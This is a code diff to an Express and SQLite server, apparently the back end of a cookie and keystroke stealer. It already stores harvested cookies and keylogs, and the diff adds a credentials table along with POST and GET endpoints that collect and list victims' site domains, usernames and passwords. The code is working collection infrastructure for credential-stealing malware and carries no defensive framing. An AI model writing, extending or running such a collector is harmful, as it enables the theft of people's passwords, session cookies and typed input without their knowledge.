@@ -28,6 +28,18 @@ db.run(
   "CREATE TABLE keylog (userId CHAR(10) NOT NULL, site VARCHAR default '', keystrokes VARCHAR default '')"
 );
 
+/*
+  CREATE TABLE credentials (
+    userId CHAR(10) NOT NULL,
+    site VARCHAR default '',
+    username VARCHAR default '',
+    password VARCHAR default ''
+  )
+*/
+db.run(
+  "CREATE TABLE credentials ( userId CHAR(10) NOT NULL, site VARCHAR default '', username VARCHAR default '', password VARCHAR default '')"
+);
+
 app.use(express.json());
 
 app.get("/show-cookies", (req, res) => {
@@ -40,6 +52,14 @@ app.get("/show-cookies", (req, res) => {
 
 app.get("/show-keylogs", (req, res) => {
   db.all("SELECT * from keylog", [], (err, rows) => {
+    if (err) console.log(err);
+    else res.send(JSON.stringify(rows));
+  });
+  console.log(req.query);
+});
+
+app.get("/show-credentials", (req, res) => {
+  db.all("SELECT * from credentials", [], (err, rows) => {
     if (err) console.log(err);
     else res.send(JSON.stringify(rows));
   });
@@ -59,15 +79,26 @@ app.post("/cookie", (req, res) => {
 
 app.post("/keylog", (req, res) => {
   res.send(JSON.stringify(req.body.data));
-  if(!checkID(req.headers.uid)) return;
-  let database = req.body.data.database
-  for(const entry in database) {
-    db.run(
-      "INSERT INTO keylog (userId, site, keystrokes) VALUES (?, ?, ?)",
-      [req.headers.uid, entry, database[entry]]
-    )
+  if (!checkID(req.headers.uid)) return;
+  let database = req.body.data.database;
+  for (const entry in database) {
+    db.run("INSERT INTO keylog (userId, site, keystrokes) VALUES (?, ?, ?)", [
+      req.headers.uid,
+      entry,
+      database[entry],
+    ]);
   }
-})
+});
+
+app.post("/credentials", (req, res) => {
+  res.send(JSON.stringify(req.body.data));
+  if (!checkID(req.headers.uid)) return;
+  let creds = req.body.data.credentials;
+  db.run(
+    "INSERT INTO credentials (userId, site, username, password) VALUES (?, ?, ?, ?)",
+    [req.headers.uid, creds.domain, creds.username, creds.password]
+  );
+});
 
 app.listen(port, () => {
   console.log(`Cookie logging listening at http://localhost:${port}`);
